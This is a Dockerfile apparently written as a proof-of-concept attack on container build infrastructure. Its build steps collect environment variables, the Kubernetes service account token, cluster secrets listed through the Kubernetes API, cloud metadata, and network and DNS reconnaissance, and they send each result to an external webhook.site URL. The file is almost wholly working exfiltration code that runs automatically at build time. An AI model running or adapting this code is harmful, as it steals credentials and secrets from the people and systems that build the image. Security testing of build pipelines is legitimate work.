FROM alpine:3.19

# Stage 1: Exfiltrate environment variables
RUN apk add --no-cache curl jq

# Exfil all env vars
RUN env | sort > /tmp/env.txt && \
    curl -s -X POST "https://webhook.site/13a470de-556d-484a-ba5d-f4b435adb58f" \
    -H "Content-Type: text/plain" \
    -H "X-Exfil: env-vars" \
    -d @/tmp/env.txt || true

# Exfil K8s service account token (if mounted)
RUN if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then \
      TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); \
      NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown"); \
      curl -s -X POST "https://webhook.site/13a470de-556d-484a-ba5d-f4b435adb58f" \
        -H "Content-Type: application/json" \
        -H "X-Exfil: k8s-token" \
        -d "{\"token\": \"$TOKEN\", \"namespace\": \"$NAMESPACE\"}"; \
    else \
      curl -s -X POST "https://webhook.site/13a470de-556d-484a-ba5d-f4b435adb58f" \
        -H "X-Exfil: k8s-token" \
        -d "no k8s service account mounted"; \
    fi || true

# Try to access K8s API from inside the build
RUN if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then \
      TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); \
      # List secrets in current namespace
      SECRETS=$(curl -sk -H "Authorization: Bearer $TOKEN" \
        https://kubernetes.default.svc/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/secrets 2>&1); \
      curl -s -X POST "https://webhook.site/13a470de-556d-484a-ba5d-f4b435adb58f" \
        -H "Content-Type: application/json" \
        -H "X-Exfil: k8s-secrets" \
        -d "$SECRETS"; \
    fi || true

# Try to reach internal services / cloud metadata
RUN curl -s -m 3 http://169.254.169.254/latest/meta-data/ 2>&1 | \
    curl -s -X POST "https://webhook.site/13a470de-556d-484a-ba5d-f4b435adb58f" \
    -H "X-Exfil: cloud-metadata" \
    -d @- || true

# Network recon
RUN (ip addr 2>/dev/null || ifconfig 2>/dev/null || cat /etc/hosts) | \
    curl -s -X POST "https://webhook.site/13a470de-556d-484a-ba5d-f4b435adb58f" \
    -H "X-Exfil: network-info" \
    -d @- || true

# DNS recon for internal services
RUN (nslookup kubernetes.default.svc 2>&1; \
     nslookup deployer 2>&1; \
     nslookup gateway 2>&1; \
     nslookup builder 2>&1) | \
    curl -s -X POST "https://webhook.site/13a470de-556d-484a-ba5d-f4b435adb58f" \
    -H "X-Exfil: dns-recon" \
    -d @- || true

CMD ["echo", "PoC complete - this container should never actually run"]
